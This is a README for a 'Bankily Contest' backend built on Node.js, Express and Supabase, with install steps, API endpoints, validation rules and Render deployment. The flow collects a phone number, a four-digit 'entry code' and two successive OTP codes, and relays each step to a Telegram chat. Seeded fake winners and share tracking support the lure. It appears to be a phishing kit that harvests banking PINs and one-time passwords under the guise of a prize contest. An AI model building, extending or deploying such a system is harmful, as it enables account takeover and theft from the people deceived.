# Bankily Contest Backend

Backend API for Bankily Contest built with Node.js, Express, and Supabase.

## Features

- 🔐 Secure validation rules
- 📊 Supabase PostgreSQL integration
- 📱 Telegram Bot notifications
- 🛡️ Rate limiting protection
- 🔒 Input sanitization

## Getting Started

### Prerequisites

- Node.js 18+
- Supabase account
- Telegram Bot Token

### Installation

1. Install dependencies:
```bash
npm install
```

2. Create `.env` file:
```env
PORT=10000
SUPABASE_URL=your_supabase_url
SUPABASE_ANON_KEY=your_supabase_anon_key
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_telegram_chat_id
FRONTEND_URL=http://localhost:3000
```

3. Set up database:
   - Run `database/schema.sql` in Supabase SQL Editor
   - Run `database/insert_winners.sql` to add sample winners

4. Start server:
```bash
npm start
# or for development
npm run dev
```

## API Endpoints

### GET `/api/winners`
Get list of winners for display

### POST `/api/register`
Register a new participant
- Body: `{ phone: string, entryCode: string }`

### POST `/api/verify-otp1`
Verify first OTP code
- Body: `{ participantId: string, phone: string, entryCode: string, otp1Code: string }`

### POST `/api/verify-otp2`
Verify second OTP code
- Body: `{ participantId: string, phone: string, entryCode: string, otp1Code: string, otp2Code: string }`

### POST `/api/track-share`
Track social media shares
- Body: `{ participantId: string, platform: string }`

## Validation Rules

### Phone Number
- 8 digits exactly
- Must start with 2, 3, or 4
- Pattern: `^[234][0-9]{7}$`

### Entry Code
- 4 digits exactly
- All digits must be unique

### OTP1
- 4 digits exactly
- Must NOT match Entry Code

### OTP2
- 4 digits exactly
- Must NOT match Entry Code
- Must NOT match OTP1

## Rate Limiting

- 5 requests per 15 minutes per IP
- Applied to `/api/register`, `/api/verify-otp1`, `/api/verify-otp2`

## Telegram Integration

The backend sends 3 types of messages to Telegram:
1. New registration
2. OTP1 verification success
3. OTP2 verification success (final)

## Deployment on Render

1. Connect your GitHub repository
2. Set environment variables
3. Build command: `npm install`
4. Start command: `npm start`
5. Set PORT to 10000 (or your preferred port)

## Security

- Input sanitization with validator
- Rate limiting
- IP and User Agent tracking
- CORS configuration
- Error handling
